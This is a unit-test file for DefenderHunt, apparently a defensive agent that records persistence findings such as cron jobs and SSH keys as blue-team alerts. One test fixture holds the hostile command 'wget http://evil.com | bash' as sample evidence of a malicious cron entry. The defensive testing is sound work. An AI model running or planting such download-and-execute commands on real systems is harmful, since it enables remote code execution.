"""
tests/test_defender_hunt.py — Unit tests for DefenderHunt (proactive threat hunter).

Covers: tool schema, record_persistence_finding execution, phase gate, run() abort path.
"""
import os
import sys
import pytest
from unittest.mock import AsyncMock, patch, MagicMock

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from state_manager import StateManager
from agents.blue.defender_hunt import DefenderHunt


@pytest.fixture
def sm(tmp_path):
    db = str(tmp_path / "hunt_test.db")
    s = StateManager(db_path=db)
    s.initialize_engagement("10.0.0.1", "test scope")
    return s


@pytest.fixture
def hunt(sm):
    return DefenderHunt(sm)


# ---------------------------------------------------------------------------
# Tool schema
# ---------------------------------------------------------------------------

class TestHuntTools:
    def test_get_hunt_tools_returns_list(self, hunt):
        tools = hunt._get_hunt_tools()
        assert isinstance(tools, list)
        assert len(tools) >= 1

    def test_record_persistence_finding_tool_schema(self, hunt):
        tools = hunt._get_hunt_tools()
        names = [t["name"] for t in tools]
        assert "record_persistence_finding" in names

    def test_tool_has_required_fields(self, hunt):
        tools = hunt._get_hunt_tools()
        tool = next(t for t in tools if t["name"] == "record_persistence_finding")
        required = tool["input_schema"]["required"]
        assert "mechanism" in required
        assert "location" in required
        assert "evidence" in required
        assert "mitre_ttp" in required


# ---------------------------------------------------------------------------
# Tool execution — record_persistence_finding
# ---------------------------------------------------------------------------

class TestExecuteHuntTool:
    def test_record_persistence_finding_adds_blue_alert(self, hunt, sm):
        result = hunt._execute_hunt_tool(
            "record_persistence_finding",
            {
                "mechanism": "cron",
                "location": "/etc/crontab",
                "evidence": "wget http://evil.com | bash",
                "severity": "high",
                "mitre_ttp": "T1053.003",
            },
        )
        assert "cron" in result.lower() or "/etc/crontab" in result
        alerts = sm.read().get("blue_alerts", [])
        assert len(alerts) >= 1
        assert any("PERSISTENCE_CRON" in a.get("type", "") for a in alerts)

    def test_record_persistence_ssh_key(self, hunt, sm):
        hunt._execute_hunt_tool(
            "record_persistence_finding",
            {
                "mechanism": "ssh_key",
                "location": "/root/.ssh/authorized_keys",
                "evidence": "unknown public key appended",
                "severity": "high",
                "mitre_ttp": "T1098.004",
            },
        )
        alerts = sm.read().get("blue_alerts", [])
        assert any("SSH_KEY" in a.get("type", "") for a in alerts)

    def test_unknown_tool_falls_back(self, hunt):
        # Should not raise; delegates to _execute_tool
        with patch.object(hunt, "_execute_tool", return_value="ok") as mock_exec:
            result = hunt._execute_hunt_tool("nonexistent_tool", {})
        mock_exec.assert_called_once()


# ---------------------------------------------------------------------------
# run() — abort on exception, metadata written on success
# ---------------------------------------------------------------------------

class TestRun:
    @pytest.mark.asyncio
    async def test_run_calls_tool_loop(self, hunt):
        with patch.object(hunt, "_run_tool_loop", new=AsyncMock(return_value="hunt_complete")):
            with patch.object(hunt.artifact_manager, "store_artifact"):
                await hunt.run("Scan for persistence")

    @pytest.mark.asyncio
    async def test_run_stores_artifact_on_success(self, hunt):
        with patch.object(hunt, "_run_tool_loop", new=AsyncMock(return_value="done")):
            stored = []
            with patch.object(
                hunt.artifact_manager,
                "store_artifact",
                side_effect=lambda **kw: stored.append(kw),
            ):
                await hunt.run("Hunt run")
        assert len(stored) == 1
        assert "proactive_hunt" in stored[0]["filename"]

    @pytest.mark.asyncio
    async def test_run_propagates_exception(self, hunt):
        with patch.object(hunt, "_run_tool_loop", new=AsyncMock(side_effect=RuntimeError("boom"))):
            with pytest.raises(RuntimeError, match="boom"):
                await hunt.run()
